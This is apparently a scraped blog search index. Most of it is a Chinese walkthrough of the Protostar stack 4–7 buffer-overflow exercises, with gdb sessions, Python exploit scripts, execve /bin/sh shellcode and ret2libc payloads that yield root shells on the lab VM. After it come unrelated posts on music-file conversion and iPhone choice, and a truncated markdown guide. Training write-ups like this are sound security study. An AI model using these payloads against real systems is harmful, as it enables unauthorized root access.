\u0026lt;main+13\u0026gt;:\tmov %eax,(%esp) 0x08048418 \u0026lt;main+16\u0026gt;:\tcall 0x804830c \u0026lt;gets@plt\u0026gt; 0x0804841d \u0026lt;main+21\u0026gt;:\tleave 0x0804841e \u0026lt;main+22\u0026gt;:\tret End of assembler dump. 首先在 0x0804841e \u0026lt;main+22\u0026gt;:\tret 处设置断点\n(gdb) break *0x0804841e Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16. 为了方便可以写一个字母表\u0026hellip;就大概知道栈溢出到了什么地方..总之就是为了方便x\nuser@protostar:/tmp$ more alb AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV 运行，并查看栈\n这里就 x/24wx $esp 好了\n(gdb) run \u0026lt; alb Starting program: /opt/protostar/bin/stack4 \u0026lt; alb Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x5353535b ) at stack4/stack4.c:16 16\tin stack4/stack4.c (gdb) x/24wx $esp 0xbffff79c:\t0x54545454\t0x55555555\t0x56565656\t0xbffff800 0xbffff7ac:\t0xb7fe1848\t0xbffff800\t0xffffffff\t0xb7ffeff4 0xbffff7bc:\t0x0804824b\t0x00000001\t0xbffff800\t0xb7ff0626 0xbffff7cc:\t0xb7fffab0\t0xb7fe1b28\t0xb7fd7ff4\t0x00000000 0xbffff7dc:\t0x00000000\t0xbffff818\t0xfc365215\t0xd6616405 0xbffff7ec:\t0x00000000\t0x00000000\t0x00000000\t0x00000001 可见现在栈最高处存着 0x54545454，而这就是 EIP 马上会取的 Return Address\n前进一步看看\n(gdb) si Cannot access memory at address 0x53535357 (gdb) info registers eax 0xbffff750\t-1073744048 ecx 0xbffff750\t-1073744048 edx 0xb7fd9334\t-1208118476 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff7a0\t0xbffff7a0 ebp 0x53535353\t0x53535353 esi 0x0\t0 edi 0x0\t0 eip 0x54545454\t0x54545454 eflags 0x200246\t[ PF ZF IF ID ] cs 0x73\t115 ss 0x7b\t123 ds 0x7b\t123 es 0x7b\t123 fs 0x0\t0 gs 0x33\t51 看来确实是 eip 0x54545454\n接下来只要把 0x54545454 改成 void win() 的地址即可\nuser@protostar:/tmp$ more stack4.py padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\u0026#34; win = \u0026#34;\\xf4\\x83\\x04\\x08\u0026#34; print (padding + win) user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4 code flow successfully changed Segmentation fault user@protostar:/tmp$ Stack Five Stack5 is a standard buffer overflow, this time introducing shellcode.\nThis level is at /opt/protostar/bin/stack5\nHints\nAt this point in time, it might be easier to use someone elses shellcode If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger remove the int3s once your shellcode is done. #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 终于可以开始执行 shellcode 了，好耶w\n首先通过与上题一样的步骤，我们可以改函数的 Return Address\n想执行 shellcode 的简单思路就是：\n把 shellcode 写到栈上 把 Return Address 指向写了 shellcode 的地方 但是，由于环境变量等种种问题，很可能程序每次在栈上的地址都不太一样，\n这种情况可以在 shellcode 前填充大量的 NOP\u0026hellip;这样的话不管 Return Address 指向了哪里，反正只要指向了这一大段冇用的 NOP 的话那么最终就能到达 shellcode\nNOP 的详细定义：\nThe NOP instruction does nothing. Execution continues with the next instruction. No registers or flags are affected by this instruction. NOP is typically used to generate a delay in execution or to reserve space in code memory.\n不过说起来，Hints 里提到过：\nIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger\n来看一下 \\xCC (int3) 的定义：\nThe INT3 instruction is a one-byte-instruction defined for use by debuggers to temporarily replace an instruction in a running program in order to set a code breakpoint.\n来试一下，首先找个地址来当 Return Address\n(gdb) disassemble main Dump of assembler code for function main: 0x080483c4 \u0026lt;main+0\u0026gt;:\tpush ebp 0x080483c5 \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x080483c7 \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x080483ca \u0026lt;main+6\u0026gt;:\tsub esp,0x50 0x080483cd \u0026lt;main+9\u0026gt;:\tlea eax,[esp+0x10] 0x080483d1 \u0026lt;main+13\u0026gt;:\tmov DWORD PTR [esp],eax 0x080483d4 \u0026lt;main+16\u0026gt;:\tcall 0x80482e8 \u0026lt;gets@plt\u0026gt; 0x080483d9 \u0026lt;main+21\u0026gt;:\tleave 0x080483da \u0026lt;main+22\u0026gt;:\tret End of assembler dump. (gdb) break *0x080483da Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11. (gdb) r Starting program: /opt/protostar/bin/stack5 Hello Breakpoint 1, 0x080483da in main (argc=134513604, argv=0x1) at stack5/stack5.c:11 11\tstack5/stack5.c: No such file or directory. in stack5/stack5.c (gdb) x/24wx $esp 0xbffff79c:\t0xb7eadc76\t0x00000001\t0xbffff844\t0xbffff84c 0xbffff7ac:\t0xb7fe1848\t0xbffff800\t0xffffffff\t0xb7ffeff4 0xbffff7bc:\t0x08048232\t0x00000001\t0xbffff800\t0xb7ff0626 0xbffff7cc:\t0xb7fffab0\t0xb7fe1b28\t0xb7fd7ff4\t0x00000000 0xbffff7dc:\t0x00000000\t0xbffff818\t0xf982f58c\t0xd3d5c39c 0xbffff7ec:\t0x00000000\t0x00000000\t0x00000000\t0x00000001 随便选一个\u0026hellip;比如 0xbffff7dc\n# stack5.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\u0026#34; return_address = struct.pack(\u0026#34;I\u0026#34;, 0xbffff7dc + 10) nop = \u0026#34;\\x90\u0026#34; * 300 int3 = \u0026#34;\\xCC\\xCC\\xCC\\xCC\u0026#34; print (padding + return_address + nop + int3) # 接下来 python stack5.py \u0026gt; st5 (gdb) r \u0026lt; st5 Starting program: /opt/protostar/bin/stack5 \u0026lt; st5 Program received signal SIGTRAP, Trace/breakpoint trap. 0xbffff8cd in ?? () (gdb) Program received signal SIGTRAP, Trace/breakpoint trap. 看起来是成功了\n接下来把 shellcode 也加进去吧，就用最开头的那个\n# stack5.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\u0026#34; return_address = struct.pack(\u0026#34;I\u0026#34;, 0xbffff7dc + 10) nop = \u0026#34;\\x90\u0026#34; * 300 int3 = \u0026#34;\\xCC\\xCC\\xCC\\xCC\u0026#34; shellcode = \u0026#34;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x 89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\u0026#34; # 注意这里把 int3 去掉了 print (padding + return_address + nop + shellcode) user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5 # whoami root # 完成w\nStack Six Stack6 looks at what happens when you have restrictions on the return address.\nThis level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.\nIt is strongly suggested you experiment with multiple ways of getting your code to execute here.\nThis level is at /opt/protostar/bin/stack6\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void getpath() { char buffer[64]; unsigned int ret; printf(\u0026#34;input path please: \u0026#34;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret \u0026amp; 0xbf000000) == 0xbf000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } printf(\u0026#34;got path %s\\n\u0026#34;, buffer); } int main(int argc, char **argv) { getpath(); } 先看这部分：\nret = __builtin_return_address(0); if((ret \u0026amp; 0xbf000000) == 0xbf000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } 有一个 if((ret \u0026amp; 0xbf000000) == 0xbf000000) 的操作\u0026hellip;简单来说相当于是如果 ret 以 bf 开头的话那么条件为真（结果就是_exit(1)）\n(gdb) break main Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27. (gdb) r Starting program: /opt/protostar/bin/stack6 Breakpoint 1, main (argc=1, argv=0xbffff844) at stack6/stack6.c:27 27\tstack6/stack6.c: No such file or directory. in stack6/stack6.c (gdb) info proc map process 5679 cmdline = \u0026#39;/opt/protostar/bin/stack6\u0026#39; cwd = \u0026#39;/tmp\u0026#39; exe = \u0026#39;/opt/protostar/bin/stack6\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack] (gdb) 可见 0xbffeb000 - 0xc0000000 都是栈\u0026hellip;\n那么就变成了：「只要 ret 指向栈上的某个地址，那么就会 _exit(1)」\nexploit #0 : ret2ret 瞎取的名字x\n即，虽然它会检查 ret 要返回到的地址会不会被修改到栈上\u0026hellip;\n但如果 ret 到自己呢\u0026hellip;\n(gdb) disassemble getpath Dump of assembler code for function getpath: # 省略一部分 0x080484c2 \u0026lt;getpath+62\u0026gt;:\tjne 0x80484e4 \u0026lt;getpath+96\u0026gt; 0x080484c4 \u0026lt;getpath+64\u0026gt;:\tmov eax,0x80485e4 0x080484c9 \u0026lt;getpath+69\u0026gt;:\tmov edx,DWORD PTR [ebp-0xc] 0x080484cc \u0026lt;getpath+72\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x080484d0 \u0026lt;getpath+76\u0026gt;:\tmov DWORD PTR [esp],eax 0x080484d3 \u0026lt;getpath+79\u0026gt;:\tcall 0x80483c0 \u0026lt;printf@plt\u0026gt; 0x080484d8 \u0026lt;getpath+84\u0026gt;:\tmov DWORD PTR [esp],0x1 0x080484df \u0026lt;getpath+91\u0026gt;:\tcall 0x80483a0 \u0026lt;_exit@plt\u0026gt; 0x080484e4 \u0026lt;getpath+96\u0026gt;:\tmov eax,0x80485f0 0x080484e9 \u0026lt;getpath+101\u0026gt;:\tlea edx,[ebp-0x4c] 0x080484ec \u0026lt;getpath+104\u0026gt;:\tmov DWORD PTR [esp+0x4],edx 0x080484f0 \u0026lt;getpath+108\u0026gt;:\tmov DWORD PTR [esp],eax 0x080484f3 \u0026lt;getpath+111\u0026gt;:\tcall 0x80483c0 \u0026lt;printf@plt\u0026gt; 0x080484f8 \u0026lt;getpath+116\u0026gt;:\tleave 0x080484f9 \u0026lt;getpath+117\u0026gt;:\tret End of assembler dump. 比如 0x080484f9 \u0026lt;getpath+117\u0026gt;:\tret 这里会被检查是否 ret 到了栈上 但如果 ret 到自己（0x080484f9 \u0026lt;getpath+117\u0026gt;）的话，那接下来这一次 ret 要到的地址就不会被检查\u0026hellip;\n#stack6_0.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT\u0026#34; # 第一次 ret 到 0x080484f9 也就是 ret 自己所处的地址 ret_first_time = struct.pack(\u0026#34;I\u0026#34;, 0x080484f9) # 第二次 ret 到栈上随便某个地方 ret_second_time = struct.pack(\u0026#34;I\u0026#34;, 0xbffff7dc + 30) nop = \u0026#34;\\x90\u0026#34; * 300 shellcode = \u0026#34;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\u0026#34; print (padding + ret_first_time + ret_second_time + nop + shellcode) user@protostar:/tmp$ python stack6_0.py | /opt/protostar/bin/stack6 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP?RRRRSSSSTTTT?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀Sh/ttyh/dev??1?f?\u0026#39;?̀1?Ph//shh/bin??PS?ᙰ ̀ # whoami root # exploit #1 : ret2libc A Ret2libC attack allows us to call the C function system and a function called exit in order to spawn a shell and thereafter allow the program to exit cleanly without arousing any suspicion.\n既然想执行 /bin/sh 的话，首先得调用 system\n(gdb) p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7ecffb0 \u0026lt;__libc_system\u0026gt; 然后找找 /bin/sh 在哪\nuser@protostar:/tmp$ strings -a -t x /lib/libc-2.11.2.so | grep \u0026#34;/bin/sh\u0026#34; 11f3bf /bin/sh (gdb) info proc map process 5972 cmdline = \u0026#39;/opt/protostar/bin/stack6\u0026#39; cwd = \u0026#39;/tmp\u0026#39; exe = \u0026#39;/opt/protostar/bin/stack6\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack] 可见 /lib/libc-2.11.2.so 的 Start Addr 是 0xb7e97000\n(gdb) x/s 0xb7e97000+0x11f3bf 0xb7fb63bf:\t\u0026#34;/bin/sh\u0026#34; 那么\n\u0026lt;__libc_system\u0026gt;: 0xb7ecffb0\n/bin/sh: 0xb7fb63bf\n再回顾一下：\n正常情况下在一个函数看来栈的布局 [higher memory] caller\u0026rsquo;s frame argument passed by the caller return address saved ebp ☜ ebp local variable 1 local variable 2 local variable 3 ☜ esp [lower memory] 我们并非通过 Call 来到达 System 的，而是直接跳过去的，\n所以必须得把栈变成上面的形状才能正常正常运行\n这里使用的是 ☞ cdecl 调用公约\n其中，/bin/sh: 0xb7fb63bf 这个地址就是 System 的参数，也就是一个字符串的地址\n但是还需要另一个参数，是 System 执行完成后的返回地址（这个地址可以乱写，但不能没有）\n（system 把参数的字符串当成 shell command 来执行）\n对应一下： [higher memory] caller\u0026rsquo;s frame argument passed by the caller ☜ return_addr_after_system + /bin/sh: 0xb7fb63bf return address ☜ \u0026lt;__libc_system\u0026gt;: 0xb7ecffb0 saved ebp ☜ ebp ☜ we dont care local variable 1 local variable 2 local variable 3 ☜ esp ☜ buffer overflow begins [lower memory] 可以试试了\n# stack6_1.py import struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT\u0026#34; libc_system = struct.pack(\u0026#34;I\u0026#34;, 0xb7ecffb0) return_addr_after_system = \u0026#34;AAAA\u0026#34; bin_sh_addr = struct.pack(\u0026#34;I\u0026#34;, 0xb7fb63bf) print (padding + libc_system + return_addr_after_system + bin_sh_addr) user@protostar:/tmp$ python stack6_1.py | /opt/protostar/bin/stack6 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c?? Segmentation fault user@protostar:/tmp$ 为什么就没有了呢，怎么会是呢\n实际上确实已经有一个 /bin/sh 生成了，可是还什么都没输入就退出了\n这时候可以使用 cat\n直接执行 cat 的话，效果是复读\nuser@protostar:/tmp$ cat Hello Hello Hey Hey Minty daisuki x Minty daisuki x ^C user@protostar:/tmp$ 把命令改成这样可以保证 shell 一直打开，并通过管道来重定向输入\n(python stack6_1.py; cat) | /opt/protostar/bin/stack6 试一下的话\nuser@protostar:/tmp$ (python stack6_1.py; cat) | /opt/protostar/bin/stack6 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c?? whoami root ls / bin boot dev\tetc home initrd.img lib live lost+found media mnt opt proc sbin selinux srv sys tmp usr\tvar vmlinuz 成功w\nStack Seven Stack6 introduces return to .text to gain code execution.\nThe metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.\nThis level is at /opt/protostar/bin/stack7\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; char *getpath() { char buffer[64]; unsigned int ret; printf(\u0026#34;input path please: \u0026#34;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret \u0026amp; 0xb0000000) == 0xb0000000) { printf(\u0026#34;bzzzt (%p)\\n\u0026#34;, ret); _exit(1); } printf(\u0026#34;got path %s\\n\u0026#34;, buffer); return strdup(buffer); } int main(int argc, char **argv) { getpath(); } 实际上这题和上面的 Stack Six 差不多，结合一下 ret2ret 和 ret2libc 就可以了\nimport struct padding = \u0026#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT\u0026#34; ret_itself_addr = struct.pack(\u0026#34;I\u0026#34;, 0x08048544) libc_system = struct.pack(\u0026#34;I\u0026#34;, 0xb7ecffb0) return_addr_after_system = \u0026#34;AAAA\u0026#34; bin_sh_addr = struct.pack(\u0026#34;I\u0026#34;, 0xb7fb63bf) print (padding+ ret_itself_addr + libc_system + return_addr_after_system + bin_sh_addr) user@protostar:/tmp$ (python stack7.py; cat) | /opt/protostar/bin/stack7 input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPDRRRRSSSSTTTTD???AAAA?c?? whoami root ls / bin boot dev\tetc home initrd.img lib live lost+found media mnt opt proc sbin selinux srv sys tmp usr\tvar vmlinuz ","date":"2022-03-22T00:00:00Z","permalink":"/p/protostar_stack_4-7/","title":"Protostar Stack 0-7 Walkthrough"},{"content":" 有人发现上面这个是在模仿黑魂一的「中毒了」提示么x\n选项 #1\n选项 #2\nmp3.aoleiao.com\n叹气气 总之以后就方便多了\n这篇还是姑且留在这里吧..\n首先的话..姑且先是常规操作\n基操 Mac 上的格式转换软件 这里只推荐 XLD，真的yyds（\n免费功能还多还方便\n顺带一提： 很重要的一件事情就是 iTunes 不认识 Flac 的所以建议全部导出成 Apple Loseless\n网易云私有格式 NCM → FLAC / MP3 这里的话..直接用 这个 ncm.worthsee.com 就能全部转换\n唯一的问题是，至少在 Safari 上的「批量下载」是会有遗漏的\u0026hellip;所以还是一首一首点比较好\n坑：\n很离谱，转换出来如果是 Flac 的话所有的 Meta 信息都会丢失..\n封面艺术家专辑名之类的全部没了x 草\n\u0026hellip;总之请继续往后看吧\nMac 上的 Meta 信息编辑软件 推荐软件：就叫「META」\n可以批量编辑，也可以搜索 iTunes Store 的专辑封面帮你填充上去\n正文？ NCM → FLAC 所造成的 Meta 信息丢失的「批量」解决办法 姑且有以下步骤解决：\n1. 网易云音乐，设置下载音质：无损\n这一步是为了获取无损音源\n2. 将这个播放列表下载下来，放到文件夹A中\n姑且先把文件夹命名为「META 信息丢失 TMP」\n这里即将要存的都是 「无损、但丢 Meta 信息了的」\n3. 使用上述的那个网站将 NCM → FLAC / MP3\n这时候就会出现 NCM → FLAC 时候的 Meta 信息丢失了\n不过问题不大x\n4. 再使用 XLD 将 FLAC → Apple Loseless\n毕竟 iTunes 不认识 Flac 的\n5. 网易云音乐，设置下载音质：极高\n这一步主要还是为了获得 Meta 信息完整的歌曲\n再说一遍、无损和 Meta 信息不能共存的原因就是第三步那个网站转换 Flac 的话会把 Meta 弄丢\n6. 将这个播放列表下载下来，放到文件夹B中\n姑且先把文件夹命名为「META 信息备份 TMP」\n这里即将要存的都是 「有损、但也有 Meta 信息的」\n7. 使用上述的那个网站将 NCM → MP3\n这次因为没有 Flac 的所以全部歌曲的 Meta 都能保留\n8. 建立文件夹 TMP，先把文件夹A的内容扔进去\nTMP 此时内含：\nMeta 信息丢失了的 Apple Loseless 文件 或许本来就没有无损版本的，Meta 信息完整的 MP3 文件 9. 再把文件夹B的内容扔进去\n此时，B重的 MP3 文件会覆盖A的， 但是介于它们都是 Meta 信息完整的 MP3 所以没什么好担心的\nTMP 此时内含：\nMeta 信息丢失了的 Apple Loseless 文件 与 Meta 信息丢失了的 Apple Loseless 文件文件名相同的 Meta 信息完整的 MP3 文件 或许本来就没有无损版本的，Meta 信息完整的 MP3 文件 10. 全部扔到 Meta 编辑器里去，接着以文件名排序\n这时候你会发现这样的情况：\n很显然第一首是没有 Meta 信息的\n这时候 Meta 编辑器给了乃一个神仙功能————\n11. Meta 信息：拷贝\u0026amp;粘贴\n就这么简单..一首一首拷贝\u0026amp;粘贴 Meta 信息\n什么你还觉得麻烦..?!\n那你来找出更好的解决方案啊（（\n至少比起一首一首查搜索引擎来补全 Meta 信息好多了\u0026hellip;\n12. 删除重复文件\n在文件管理器中按照文件名排序\n然后把所有文件名重复中后缀是 MP3 的那个删掉\n13. End，直接扔进 iTunes\n终于结束了\u0026hellip;\n好诶\u0026hellip;\nend. 所以说..是不是如果 NCM → Flac 不丢 Meta 信息的话就不用管这些了啊\u0026hellip;\n或者乃对无损没有追求的话\n草！\n其实咱挺木耳的、但是还是想姑且让音乐库里尽量是无损Ver（\n而且网易云确实太花里胡哨了、虽然一起听歌功能很好玩\u0026hellip;\n还有一点咱其实是 iPod 用户而且 iTunes 里面真的上千首歌曲的时候管理起来超级方便wwww\n特别是智能播放列表这些太棒了ww\n总之就写这些了\u0026hellip;瘫x\n","date":"2021-08-20T00:00:00Z","image":"/p/netease-to-itunes/cover_hua37807c73b58aa24688c7ac4c506baa4_1433221_120x120_fill_box_smart1_3.png","permalink":"/p/netease-to-itunes/","title":"【已失效】关于网易云的音乐如何保留完整 Meta 信息着导入 iTunes"},{"content":" 还是选 iPhone 是因为咱是 iCloud 的重度用户而且和 Mac 结合非常方便\n因为只是「笔记」所以本文充满了我的偏见与独断x\n截止目前2021.7.27，同样是二手、国行、九新+、256G XR 和 XS 的价格都在 2500 左右， 且 XR 会稍微便宜一点（也就在两三百左右\n接下来记录一下自己查资料时的一些思路\n外观 \u0026amp; 手感 不得不说我感觉 XR 的单摄像头好好看啊啊啊啊\n而且花里胡哨的颜色\n但好像很多人对 XR 的边框很不满\n但我平常是看屏幕不是看边框啊喂，停航母边框又咋样、反正我也不戴tao——\n* 看了下自己背面全是坑正面玻璃全碎的 6S\n我觉得可能还是戴套比较好。\n顺便因为 XR 还挺厚，\n所以至少 XS 戴套的话正面无论看起来还是操作起来都会优于 XR 的吧\n（话说上一句话不应该是归类于#屏幕节么x\n所以对我来说的话，\n如果都戴套：\n手感：XS \u0026gt; XR\n外观：半斤八两，虽然 XS 赢了正面但背面果然还是 XR 好看\n续航 毕竟这个 6S 已经\u0026hellip;2015 年发布到现在已经 6 年了所以电池实在是\u0026hellip;\nXS 的续航嘛\u0026hellip;\n不用说了\n续航：XS \u0026lt; XR\n性能 似乎我不是很关注手机的性能毕竟不太用手机玩游戏的\n但是觉得这也很有必要放进考虑里\nXS 的内存是 4GB，XR 与 X 一样是 3GB\n其实反正是墓碑后台所以估计在未来两年内（瞎猜的）除了 XR 可能偶尔杀杀后台以外其他地方几乎无区别\n顺便隔壁 SE 二代也是 3GB 内存来着\n话说是哪个啥比起头把闪存也叫做内存的\n现在说个「内存」都不知道在指 RAM 还是闪存kuso\u0026hellip;\n另外两个都是 A12 处理器，但很重要的是，XS 是双层主板\n所以发热很——严重\n那\n发热严重 → 降频 \u0026amp;\u0026amp; 屏幕亮度降低 → 看起来和摸起来都很不舒服\nemm实在不知道怎么比\n或许因为我不算重度使用的人所以我还是考虑：\nRAM 更大 → 可以撑更多年\nXS \u0026gt; XR\n摄影 原谅我用了「摄影」而不是「拍照」、因为只是觉得前者好听x\nXR 的主摄 和 XS 的其实是一个\nXS 多的那个长焦镜头\u0026hellip;至少它有\n「人像模式」也就是模拟景深的这部分\nXR 虽然可以靠算法识别出人把人给抠出来，\n但是它只能识别人（草\nXS 的话是利用到了那个长焦镜头所以其他一些东西也可以模拟景深（虽然效果并不好\n但是本着有总比没有强x\n摄像：XR \u0026gt; XS\n屏幕 emm\n其实并不是很不在乎这个\u0026hellip;\n因为用过很长时间的 Windows Phone 所以我个人偏向 OLED 因为黑色舒服\n其实不喜欢 iOS 的深色模式、只是因为我觉得看不清（或许是 6S 的问题\n所以其实 LCD 也无所谓\n不觉得 XR 1792×828 \u0026amp; 326 ppi 的屏幕没法看\nXS 5.8 英寸，XR 6.1 英寸；其实我觉得都可\nXR 没有 3D Touch，但是我还是挺喜欢的\n结论\nXS 因为还有 3D Touch 所以 略微 优于 XR\n杂项 双卡对我无所谓 信号似乎 XR 略微好一点 XR IP67，XS IP68，但我肯定不会闲的无聊往一两米深的水里丢x null 总结 没想好\u0026hellip;\n或许对我来说 XS..?\n再不行我就抛个硬币让命运石之门帮我决定得了ww\n","date":"2021-07-27T00:00:00Z","permalink":"/p/2021-ip-xr-or-xs/","title":"关于 2021 年捡垃圾是选 XR 还是 XS 的笔记"},{"content":"Markdown For Typora Overview Markdown is created by Daring Fireball; the original guideline is here. Its syntax, however, varies between different parsers or editors. Typora is using GitHub Flavored Markdown.\n[toc]\nBlock Elements Paragraph and line breaks A paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press Return once) to create a new paragraph.\nPress Shift + Return to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert \u0026lt;br/\u0026gt;.\nHeaders Headers use 1-6 hash (#) characters at the start of the line, corresponding to header levels 1-6. For example:\n# This is an H1 ## This is an H2 ###### This is an H6 In Typora, input ‘#’s followed by title content, and press Return key will create a header.\nBlockquotes Markdown uses email-style \u0026gt; characters for block quoting. They are presented as:\n\u0026gt; This is a blockquote with two paragraphs. This is first paragraph. \u0026gt; \u0026gt; This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. \u0026gt; This is another blockquote with one paragraph. There is three empty line to seperate two blockquote. In Typora, inputting ‘\u0026gt;’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘\u0026gt;’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘\u0026gt;’.\nLists Input * list item 1 will create an unordered list - the * symbol can be replace with + or -.\nInput 1. list item 1 will create an ordered list - their markdown source code is as follows:\n## un-ordered list * Red * Green * Blue ## ordered list 1. Red 2. Green 3.\tBlue Task List Task lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:\n- [ ] a task list item - [ ] list syntax required - [ ] normal **formatting**, @mentions, #1234 refs - [ ] incomplete - [x] completed You can change the complete/incomplete state by clicking on the checkbox before the item.\n(Fenced) Code Blocks Typora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.\nUsing fences is easy: Input ``` and press return. Add an optional language identifier after ``` and we\u0026rsquo;ll run it through syntax highlighting:\nHere\u0026#39;s an example: ```js function test() { console.log(\u0026#34;notice the blank line before this function?\u0026#34;); } ``` syntax highlighting: ```ruby require \u0026#39;redcarpet\u0026#39; markdown = Redcarpet.new(\u0026#34;Hello World!\u0026#34;) puts markdown.to_html ``` Math Blocks You can render LaTeX mathematical expressions using MathJax.\nTo add a mathematical expression, input $$ and press the \u0026lsquo;Return\u0026rsquo; key. This will trigger an input field which accepts Tex/LaTex source. For example:\n$$ \\mathbf{V}_1 \\times \\mathbf{V}_2 = 